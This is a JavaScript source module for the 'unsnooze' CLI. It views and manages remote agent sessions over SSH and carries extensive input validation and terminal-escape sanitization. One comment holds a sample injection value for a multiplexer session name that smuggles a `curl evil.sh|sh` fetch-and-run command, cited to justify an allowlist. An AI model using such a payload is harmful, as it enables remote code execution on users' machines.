// Fleet: see and manage unsnooze sessions on other machines over the user's
// own OpenSSH. Pull model — no ports, no custom auth, no new deps. The
// remote daemon does all typing under its own gates; this side only views
// and marks. Security invariants (see plans/multi-host-sessions.md):
// allowlisted host tokens, closed verb set, sentinel-framed JSON, and
// control-char-stripped ingest.
import { join } from 'node:path';
import { readFileSync, writeFileSync, renameSync, mkdirSync } from 'node:fs';
import { spawn } from 'node:child_process';
import { STATE_DIR } from './config.js';
import { colors, shouldUseTui, makeTable, logoBlock, badge } from './tui.js';

export const SCHEMA = 1;
export const MIN_SCHEMA = 1;
export const BEGIN = '___UNSNOOZE_BEGIN___';
export const END = '___UNSNOOZE_END___';

// Host aliases/destinations: no leading '-' (ssh would read it as an option —
// the git CVE-2017-1000117 class), no whitespace or shell metacharacters.
export const HOST_RE = /^[A-Za-z0-9][A-Za-z0-9_.@-]*$/;
// Session keys as produced by state.js (uuid or pane:<hash>:<ts>).
export const KEY_RE = /^[A-Za-z0-9:%._-]{1,128}$/;

export function validHostToken(s) {
  return typeof s === 'string' && s.length > 0 && s.length <= 128 && HOST_RE.test(s);
}

const REMOTE_VERBS = new Set(['status', 'resume', 'cancel']);

// Fixed hardening flags, always before the host so nothing tainted can be
// read as an option. StrictHostKeyChecking is deliberately NOT set: a CLI -o
// would override a stricter user config; unknown hosts fail fast under
// BatchMode with a clear hint instead.
export function sshArgs(dest, remoteCmd) {
  if (!validHostToken(dest)) throw new Error(`invalid host: ${JSON.stringify(dest)}`);
  const [verb, ...rest] = remoteCmd;
  if (!REMOTE_VERBS.has(verb)) throw new Error(`invalid remote verb: ${verb}`);
  for (const a of rest) {
    if (!KEY_RE.test(String(a))) throw new Error(`invalid remote arg: ${JSON.stringify(a)}`);
  }
  return [
    '-o', 'BatchMode=yes',
    '-o', 'ConnectTimeout=5',
    '-o', 'ControlMaster=auto',
    '-o', `ControlPath=${join(STATE_DIR, 'ssh-%C')}`,
    '-o', 'ControlPersist=60s',
    '-T',
    dest,
    'unsnooze', '_remote', verb, ...rest.map(String),
  ];
}

export function frameEnvelope(obj) {
  return BEGIN + JSON.stringify(obj) + END;
}

export function extractEnvelope(text) {
  const s = String(text ?? '');
  const a = s.indexOf(BEGIN);
  const b = s.indexOf(END, a + BEGIN.length);
  if (a === -1 || b === -1) return null;
  try {
    return JSON.parse(s.slice(a + BEGIN.length, b));
  } catch {
    return null;
  }
}

// Kill every escape/control channel a hostile remote could use against the
// local terminal, then cap length. Covers both the 7-bit (ESC-prefixed) and
// 8-bit (raw C1 byte) encodings of each sequence class:
//   - DCS   (Device Control String): ESC P ... ST   | C1 0x90 ... ST
//   - SOS/PM/APC (string-type):      ESC X/^/_ ... ST | C1 0x98/0x9e/0x9f ... ST
//   - OSC   (incl. window title 0/2, hyperlinks 8, clipboard 52): ESC ] ... BEL|ST | C1 0x9d ... BEL|ST
//   - CSI   (SGR color codes etc):   ESC [ ... final | C1 0x9b ... final
//   - bare two-char escapes (ESC c, ESC 7, ESC =, ...)
//   - C0 controls (incl. TAB/LF/CR), DEL, and any leftover single C1 byte —
//     all fleet string fields are single-line, so TAB/LF/CR are stripped too
//     rather than let a hostile field inject fake rows into the fleet table
// Alternation order matters: the multi-byte sequence forms are tried before
// the single-byte catch-all so a C1 introducer (e.g. \x9b) consumes its
// whole sequence instead of being stripped alone and leaking its payload.
// (The Terminal DiLLMa / Codex-CLI ANSI-injection class.)
/* eslint-disable no-control-regex */
const VT_RE =
  /(?:\x1bP|\x90)[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b[X^_]|[\x98\x9e\x9f])[^\x1b\x9c]*(?:\x1b\\|\x9c)?|(?:\x1b\]|\x9d)[^\x07\x1b\x9c]*(?:\x07|\x1b\\|\x9c)?|(?:\x1b\[|\x9b)[0-9:;<=>?]*[ -/]*[@-~]?|\x1b[ -~]?|[\x00-\x1f\x7f\x80-\x9f]/g;

export function stripRemoteText(s, max = 256) {
  if (s == null) return '';
  return String(s).replace(VT_RE, '').slice(0, max);
}

export function validateEnvelope(obj) {
  if (!obj || typeof obj !== 'object' || Array.isArray(obj)) return { ok: false, reason: 'not an object' };
  if (!Number.isInteger(obj.schema) || !Number.isInteger(obj.minSchema)) return { ok: false, reason: 'missing schema' };
  if (obj.minSchema > SCHEMA || obj.schema < MIN_SCHEMA) {
    return { ok: false, reason: `version skew (remote schema ${obj.schema}, local ${SCHEMA})` };
  }
  return { ok: true };
}

// ---------------------------------------------------------------------------
// Host registry — ~/.unsnooze/hosts.json  { "<name>": "<ssh destination>" }
// A separate single-purpose file (not config.json): settings.js has no
// dynamic-key support and the config surface stays small.
// ---------------------------------------------------------------------------

const HOSTS_FILE = join(STATE_DIR, 'hosts.json');

export function readHosts() {
  const out = Object.create(null);
  try {
    const raw = JSON.parse(readFileSync(HOSTS_FILE, 'utf-8'));
    if (raw && typeof raw === 'object' && !Array.isArray(raw)) {
      for (const [name, dest] of Object.entries(raw)) {
        if (validHostToken(name) && validHostToken(dest)) out[name] = dest;
      }
    }
  } catch { /* absent or unreadable → empty */ }
  return out;
}

export function writeHosts(hosts) {
  mkdirSync(STATE_DIR, { recursive: true });
  const tmp = HOSTS_FILE + `.tmp.${process.pid}`;
  writeFileSync(tmp, JSON.stringify(hosts, null, 2) + '\n');
  renameSync(tmp, HOSTS_FILE);
}

export async function cmdHosts(args = []) {
  const [verb, name, dest] = args;
  const hosts = readHosts();
  if (verb === 'list' || verb === undefined) {
    const names = Object.keys(hosts);
    if (names.length === 0) {
      console.log('unsnooze: no hosts registered. Add one: unsnooze hosts add <name> [ssh-destination]');
      return 0;
    }
    for (const n of names) console.log(`  ${n.padEnd(16)} ${hosts[n]}`);
    return 0;
  }
  if (verb === 'add') {
    const d = dest ?? name;
    if (!validHostToken(name) || !validHostToken(d)) {
      console.error('unsnooze: invalid host name/destination (letters, digits, . _ @ - only; no leading -).');
      return 1;
    }
    hosts[name] = d;
    writeHosts(hosts);
    console.log(`unsnooze: host ${name} → ${d}. It needs unsnooze installed and ssh key access.`);
    return 0;
  }
  if (verb === 'rm') {
    if (!(name in hosts)) {
      console.error(`unsnooze: no such host: ${name}`);
      return 1;
    }
    delete hosts[name];
    writeHosts(hosts);
    console.log(`unsnooze: removed ${name}.`);
    return 0;
  }
  console.error('usage: unsnooze hosts [list | add <name> [ssh-destination] | rm <name>]');
  return 2;
}

// ---------------------------------------------------------------------------
// ssh fan-out — one status/resume/cancel call per host, bounded concurrency,
// hard-killed on timeout so one dead box never blocks the render.
// ---------------------------------------------------------------------------

const STDOUT_CAP = 256 * 1024;
const MAX_SESSIONS = 200;
const FLEET_CACHE_FILE = join(STATE_DIR, 'fleet-cache.json');
const STALE_WINDOW_MS = 24 * 3_600_000;

// Drains a spawned ssh child: caps stdout, hard-kills at timeoutMs, and
// always resolves (never rejects) so a dead host can't hang Promise.all.
function collectChild(child, timeoutMs) {
  return new Promise((resolve) => {
    let out = Buffer.alloc(0);
    let capped = false;
    let timedOut = false;
    let done = false;
    const finish = (code) => {
      if (done) return;
      done = true;
      clearTimeout(timer);
      resolve({ code, stdout: out.toString('utf8'), timedOut });
    };
    const timer = setTimeout(() => {
      timedOut = true;
      try { child.kill('SIGKILL'); } catch { /* already gone */ }
    }, timeoutMs);
    child.stdout?.on('data', (chunk) => {
      if (capped) return;
      out = Buffer.concat([out, chunk]);
      if (out.length > STDOUT_CAP) { out = out.subarray(0, STDOUT_CAP); capped = true; }
    });
    child.on('close', (code) => finish(code));
    child.on('error', () => finish(null));
  });
}

function str(v, max) {
  if (v == null) return null;
  return stripRemoteText(v, max);
}

function num(v) {
  return Number.isFinite(v) ? v : null;
}

// Explicit field-by-field extraction into a fresh literal — never
// Object.assign/spread of the parsed remote object (prototype-pollution and
// field-smuggling defense). Every string is run through stripRemoteText.
function sanitizeSession(s) {
  if (!s || typeof s !== 'object') return null;
  return {
    key: str(s.key, 128) || '',
    sessionId: str(s.sessionId, 128),
    agent: str(s.agent, 128) || 'claude',
    cwd: str(s.cwd, 256),
    status: str(s.status, 128) || 'unknown',
    limitType: str(s.limitType, 128),
    resetAt: num(s.resetAt),
    resetSource: str(s.resetSource, 128),
    mux: str(s.mux, 128),
    pane: str(s.pane, 128),
    muxSession: str(s.muxSession, 128),
    attempts: Number.isFinite(s.attempts) ? s.attempts : 0,
    lastError: str(s.lastError, 256),
    workspaceHold: !!s.workspaceHold,
  };
}

export function sanitizeEnvelope(env) {
  const sessionsIn = Array.isArray(env?.sessions) ? env.sessions.slice(0, MAX_SESSIONS) : [];
  return {
    schema: num(env?.schema),
    minSchema: num(env?.minSchema),
    cli: str(env?.cli, 128),
    host: str(env?.host, 128),
    caps: Array.isArray(env?.caps) ? env.caps.slice(0, 16).map(c => str(c, 128)).filter(Boolean) : [],
    resumerAlive: !!env?.resumerAlive,
    sessions: sessionsIn.map(sanitizeSession).filter(Boolean),
  };
}

export async function fetchHost(name, dest, { spawnFn = spawn, timeoutMs = 8000 } = {}) {
  const at = Date.now();
  let child;
  try {
    child = spawnFn('ssh', sshArgs(dest, ['status']));
  } catch (err) {
    return { host: name, state: 'error', at, error: String(err?.message || err) };
  }
  const { code, stdout, timedOut } = await collectChild(child, timeoutMs);
  const latencyMs = Date.now() - at;
  if (timedOut) return { host: name, state: 'unreachable', at, latencyMs, error: 'timeout' };
  if (code === 255) return { host: name, state: 'unreachable', at, latencyMs, error: `ssh exit ${code}` };
  const parsed = extractEnvelope(stdout);
  if (!parsed) return { host: name, state: 'error', at, latencyMs, error: 'bad or missing response frame' };
  const v = validateEnvelope(parsed);
  if (!v.ok) return { host: name, state: 'skew', at, latencyMs, error: v.reason };
  return { host: name, state: 'online', at, latencyMs, envelope: sanitizeEnvelope(parsed) };
}

// Same transport for resume/cancel — marks state only, never types anything
// (typing lives in the remote's own daemon gates; see src/remote.js).
export async function remoteAction(name, dest, verb, key, { spawnFn = spawn, timeoutMs = 8000 } = {}) {
  const remoteCmd = key != null ? [verb, key] : [verb];
  let child;
  try {
    child = spawnFn('ssh', sshArgs(dest, remoteCmd));
  } catch (err) {
    return { ok: false, result: null, error: String(err?.message || err) };
  }
  const { code, stdout, timedOut } = await collectChild(child, timeoutMs);
  if (timedOut) return { ok: false, result: null, error: 'timeout' };
  if (code === 255) return { ok: false, result: null, error: `ssh exit ${code}` };
  const parsed = extractEnvelope(stdout);
  if (!parsed) return { ok: false, result: null, error: 'bad or missing response frame' };
  const v = validateEnvelope(parsed);
  if (!v.ok) return { ok: false, result: null, error: v.reason };
  const result = str(parsed.result, 128) || '';
  if (result === 'ok') return { ok: true, result };
  return { ok: false, result, error: `remote: ${result || 'unknown'}` };
}

export function readFleetCache() {
  try {
    const raw = JSON.parse(readFileSync(FLEET_CACHE_FILE, 'utf-8'));
    return Array.isArray(raw) ? raw : [];
  } catch {
    return [];
  }
}

export function writeFleetCache(results) {
  mkdirSync(STATE_DIR, { recursive: true });
  const tmp = FLEET_CACHE_FILE + `.tmp.${process.pid}`;
  writeFileSync(tmp, JSON.stringify(results, null, 2) + '\n');
  renameSync(tmp, FLEET_CACHE_FILE);
}

// Bounded-concurrency fan-out: a dead host is hard-killed by fetchHost's own
// timeout and never blocks the others (allSettled + a fixed worker pool,
// not one promise per host). Online results overwrite the cache; hosts that
// come back unreachable/error fall back to a cached envelope under 24h old,
// rendered as `stale` rather than dropped.
export async function fetchFleet({ hosts = readHosts(), concurrency = 4, spawnFn, timeoutMs } = {}) {
  const entries = Object.entries(hosts);
  const cacheByHost = new Map(readFleetCache().map(r => [r.host, r]));
  const results = new Array(entries.length);
  let next = 0;
  async function worker() {
    while (next < entries.length) {
      const i = next++;
      const [name, dest] = entries[i];
      try {
        results[i] = await fetchHost(name, dest, { spawnFn, timeoutMs });
      } catch (err) {
        results[i] = { host: name, state: 'error', at: Date.now(), error: String(err?.message || err) };
      }
    }
  }
  const workerCount = Math.max(1, Math.min(concurrency, entries.length));
  await Promise.allSettled(Array.from({ length: workerCount }, worker));

  const merged = results.map((r) => {
    if (r.state === 'online') return r;
    const cached = cacheByHost.get(r.host);
    if ((r.state === 'unreachable' || r.state === 'error') && cached?.envelope
      && Number.isFinite(cached.at) && (Date.now() - cached.at) < STALE_WINDOW_MS) {
      return { host: r.host, state: 'stale', at: r.at, cachedAt: cached.at, envelope: sanitizeEnvelope(cached.envelope), error: r.error };
    }
    return r;
  });

  // Only successful fetches refresh the cache; hosts we couldn't reach this
  // round keep whatever was already on disk for the next run's staleness check.
  for (const r of merged) {
    if (r.state === 'online') cacheByHost.set(r.host, { host: r.host, state: 'online', at: r.at, envelope: r.envelope });
  }
  writeFleetCache([...cacheByHost.values()]);

  return merged;
}

// muxSession is remote-controlled and only control-char-stripped on ingest
// (stripRemoteText), so shell metacharacters survive into it. The hint below
// is meant to be pasted into a local shell — unquoted interpolation of a
// hostile muxSession (e.g. `x'; curl evil.sh|sh; echo '`) would turn a
// copy-paste hint into local RCE. Session names are always plain tmux/zellij
// identifiers, so a tight allowlist costs nothing.
export const MUX_SESSION_RE = /^[A-Za-z0-9_.-]{1,64}$/;

// The local attach hint (src/reap.js: attachHint) wrapped in `ssh -t` so it
// can be pasted verbatim to reattach on the remote box. Returns null (no
// hint) rather than a dangerous string when dest or muxSession don't pass
// validation — callers must treat null as "omit the attach line".
export function attachHintRemote(dest, muxName, muxSession) {
  if (!validHostToken(dest) || typeof muxSession !== 'string' || !MUX_SESSION_RE.test(muxSession)) return null;
  const inner = muxName === 'zellij' ? `zellij attach ${muxSession}` : `tmux new -A -s ${muxSession}`;
  return `ssh -t ${dest} '${inner}'`;
}

function fmtCountdown(ms) {
  if (ms <= 0) return 'due now';
  const m = Math.round(ms / 60_000);
  if (m < 60) return `${m}m`;
  const h = Math.floor(m / 60);
  return `${h}h ${m % 60}m`;
}

function stateGlyph(state, c) {
  if (state === 'online') return c.green('● online');
  if (state === 'stale') return c.yellow('◐ stale');
  if (state === 'skew') return c.red('✗ skew');
  return c.red(`✗ ${state}`);
}

export function formatFleetTui(results, { color = true, hosts = {}, now = Date.now() } = {}) {
  const c = colors(color);
  const lines = [logoBlock('fleet', { color, subtitle: `${results.length} host(s)` }), ''];
  if (results.length === 0) {
    lines.push(c.dim('  no hosts registered. `unsnooze hosts add <name>` first.'));
    return lines.join('\n');
  }
  const rows = results.map((r) => {
    const sessions = r.envelope?.sessions ?? [];
    const counts = new Map();
    for (const s of sessions) counts.set(s.status, (counts.get(s.status) || 0) + 1);
    const summary = [...counts.entries()].map(([k, n]) => `${n} ${k}`).join(', ') || '—';
    const age = r.state === 'stale'
      ? `cached ${fmtCountdown(now - r.cachedAt)} ago`
      : (r.latencyMs != null ? `${r.latencyMs}ms` : (r.error || '—'));
    return [stateGlyph(r.state, c), r.host, summary, age];
  });
  lines.push(makeTable(['state', 'host', 'sessions', 'age'], rows, { color }));
  for (const r of results) {
    const stopped = (r.envelope?.sessions ?? []).filter(s => s.status === 'stopped');
    if (stopped.length === 0) continue;
    lines.push('');
    lines.push(c.dim(`  ${r.host}:`));
    for (const s of stopped) {
      const id = s.sessionId ? s.sessionId.slice(0, 8) : (s.key ? s.key.slice(0, 8) : '(no id)');
      const when = Number.isFinite(s.resetAt) ? fmtCountdown(s.resetAt - now) : '?';
      const dest = hosts[r.host] || r.host;
      const hint = s.muxSession ? attachHintRemote(dest, s.mux || 'tmux', s.muxSession) : null;
      lines.push(`    ${badge(s.status, { color })} ${c.bright(id)}  ${(s.agent || 'claude').padEnd(6)} resets ${when}${hint ? `  attach: ${hint}` : ''}`);
    }
  }
  return lines.join('\n');
}

// Exit 0 (nothing actionable), 1 (internal error), 2 (some online/stale host
// has a stopped session — matches `preview`'s actionable convention).
export async function cmdFleet(args = []) {
  try {
    const json = args.includes('--json');
    const hosts = readHosts();
    if (Object.keys(hosts).length === 0) {
      if (json) console.log('[]');
      else console.log('unsnooze: no hosts registered. Add one: unsnooze hosts add <name> [ssh-destination]');
      return 0;
    }
    const results = await fetchFleet({ hosts });
    const actionable = results.some(r => (r.state === 'online' || r.state === 'stale')
      && (r.envelope?.sessions ?? []).some(s => s.status === 'stopped'));
    if (json) console.log(JSON.stringify(results, null, 2));
    else console.log(formatFleetTui(results, { color: shouldUseTui(), hosts }));
    return actionable ? 2 : 0;
  } catch (err) {
    console.error(`unsnooze fleet: ${err?.message || err}`);
    return 1;
  }
}
